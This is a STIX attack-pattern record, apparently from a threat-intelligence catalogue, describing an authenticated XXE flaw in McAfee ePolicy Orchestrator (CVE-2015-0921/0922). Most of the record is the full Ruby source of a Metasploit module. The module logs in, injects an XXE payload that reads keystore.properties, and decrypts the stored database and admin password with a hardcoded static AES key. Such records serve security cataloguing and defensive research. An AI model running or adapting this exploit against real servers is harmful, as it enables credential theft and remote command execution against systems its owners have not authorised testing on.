{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--433b9699-4839-4361-94d5-89ef74cf322d",
    "created": "2024-08-14T16:32:40.253952Z",
    "modified": "2024-08-14T16:32:40.253956Z",
    "name": "McAfee ePolicy Orchestrator Authenticated XXE Credentials Exposure",
    "description": " This module will exploit an authenticated XXE vulnerability to read the keystore.properties off of the filesystem. This properties file contains an encrypted password that is set during installation. What is interesting about this password is that it is set as the same password as the database 'sa' user and of the admin user created during installation. This password is encrypted with a static key, and is encrypted using a weak cipher (ECB). By default if installed with a local SQL Server instance, the SQL Server is listening on all interfaces.  Recovering this password allows an attacker to potentially authenticate as the 'sa' SQL Server user in order to achieve remote command execution with permissions of the database process. If the administrator has not changed the password for the initially created account since installation the attacker will have the password for this account. By default, 'admin' is recommended.  Any user account can be used to exploit this, all that is needed is a valid credential.  The most data that can be successfully retrieved is 255 characters due to length restrictions on the field used to perform the XXE attack.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/mcafee_epo_xxe.rb",
            "external_id": "mcafee_epo_xxe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0921"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0922"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jan/8"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'McAfee ePolicy Orchestrator Authenticated XXE Credentials Exposure',\n      'Description'    => %q{\n      This module will exploit an authenticated XXE vulnerability to read the keystore.properties\n      off of the filesystem. This properties file contains an encrypted password that is set during\n      installation. What is interesting about this password is that it is set as the same password\n      as the database 'sa' user and of the admin user created during installation. This password\n      is encrypted with a static key, and is encrypted using a weak cipher (ECB). By default,\n      if installed with a local SQL Server instance, the SQL Server is listening on all interfaces.\n\n      Recovering this password allows an attacker to potentially authenticate as the 'sa' SQL Server\n      user in order to achieve remote command execution with permissions of the database process. If\n      the administrator has not changed the password for the initially created account since installation,\n      the attacker will have the password for this account. By default, 'admin' is recommended.\n\n      Any user account can be used to exploit this, all that is needed is a valid credential.\n\n      The most data that can be successfully retrieved is 255 characters due to length restrictions\n      on the field used to perform the XXE attack.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' #metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-0921'],\n          ['CVE', '2015-0922'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/8']\n        ],\n      'DisclosureDate' => '2015-01-06'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('TARGETURI', [ true, \"Base ePO directory path\", '/']),\n        OptString.new('USERNAME', [true, \"The username to authenticate with\", \"username\"]),\n        OptString.new('PASSWORD', [true, \"The password to authenticate with\", \"password\"])\n      ])\n  end\n\n  def run\n    key = \"\\x5E\\x9C\\x3E\\xDF\\xE6\\x25\\x84\\x36\\x66\\x21\\x93\\x80\\x31\\x5A\\x29\\x33\" #static key used\n\n    aes = OpenSSL::Cipher.new('AES-128-ECB') # ecb, bad bad tsk\n    aes.decrypt\n    aes.padding=1\n    aes.key = key\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do')\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    cookie = res.get_cookies\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'j_security_check'),\n      'method' => 'POST',\n      'vars_post' => {\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD']\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    cookie = res.get_cookies\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do'),\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    if res.code != 302\n      fail_with(Failure::Unknown, 'Authentication failed')\n    end\n\n    cookie = res.get_cookies\n\n    #This vuln requires a bit of setup before we can exploit it\n\n    print_status(\"Setting up environment for exploitation\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionNavigationLogin.do'),\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    auth_token = $1 if res.body =~ /id=\"orion.user.security.token\" value=\"(.*)\"\\/>/\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionTab.do'),\n      'vars_get' => {\n        'sectionId' => 'orion.automation',\n        'tabId' => 'orion.tasklog',\n        'orion.user.security.token' => auth_token\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'loadTableData.do'),\n      'vars_get' => {\n        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',\n        'filter' => 'scheduler.tasklog.filter.day',\n        'secondaryFilter' => '',\n        'tableCellRendererAttr' => 'taskLogCellRenderer',\n        'count' => 44,\n        'sortProperty' => 'OrionTaskLogTask.StartDate',\n        'sortOrder' => 1,\n        'id' => 'taskLogTable'\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),\n      'vars_get' => {\n        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',\n        'tableId' => 'taskLogTable',\n        'orion.user.security.token' => auth_token\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionTableUpdateState.do'),\n      'method' => 'POST',\n      'vars_post' => {\n        'dataSourceAttr' => 'scheduler.tasklog.datasource.attr',\n        'tableId' => 'taskLogTable',\n        'columnWidths' => '285,285,285,285,285,285,285,285',\n        'sortColumn' => 'OrionTaskLogTask.StartDate',\n        'sortOrder' => '1',\n        'showFilters' => 'true',\n        'currentIndex' => 0,\n        'orion.user.security.token' => auth_token,\n        'ajaxMode' => 'standard'\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'loadDisplayType.do'),\n      'method' => 'POST',\n      'vars_post' => {\n        'displayType' => 'text_lookup',\n        'operator' => 'eq',\n        'propKey' => 'OrionTaskLogTask.Name',\n        'instanceId' => 0,\n        'orion.user.security.token' => auth_token,\n        'ajaxMode' => 'standard'\n      },\n      'cookie' => cookie\n    })\n\n    print_status(\"Sending payload...\")\n\n    filepath = \"C:/Program Files (x86)/McAfee/ePolicy Orchestrator/Server/conf/orion/keystore.properties\"\n    xxe = '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///'+filepath+'\" >]><conditions><condition grouping=\"or\"><prop-key>OrionTaskLogTaskMessage.Message</prop-key><op-key>eq</op-key><value>&xxe;</value></condition></conditions>'\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionUpdateTableFilter.do'),\n      'method' => 'POST',\n      'vars_post' => {\n        'orion.user.security.token' => auth_token,\n        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',\n        'tableId' => 'taskLogTable',\n        'conditionXML' => xxe,\n        'secondaryFilter' => '',\n        'op' => 'eq',\n        'ajaxMode' => 'standard'\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    if res.code == 404\n      fail_with(Failure::Unknown, \"Server likely has mitigation in place\")\n    end\n\n    print_status(\"Getting encrypted passphrase value from keystore.properties file...\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),\n      'vars_get' => {\n        'datasourceAttr' => 'scheduler.tasklog.datasource.attr',\n        'tableId' => 'taskLogTable',\n        'orion.user.security.token' => auth_token\n      },\n      'cookie' => cookie\n    })\n\n    unless res\n      fail_with(Failure::Unknown, \"Server did not respond in an expected way\")\n    end\n\n    passphrase = $1 if res.body =~ /passphrase=(.*?)\\\\u003/\n\n    passphrase = passphrase.gsub('\\\\\\\\=', '=').gsub(\"\\\\u002f\", \"/\").gsub(\"\\\\u002b\", \"+\")\n\n    print_status(\"Base64 encoded encrypted passphrase: #{passphrase}\")\n\n    passphrase = aes.update(Rex::Text.decode_base64(passphrase)) + aes.final\n\n    print_good(\"The decrypted password for the keystore, 'sa' SQL user (if using local instance), and possibly 'admin' is: #{passphrase}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-01-06"
}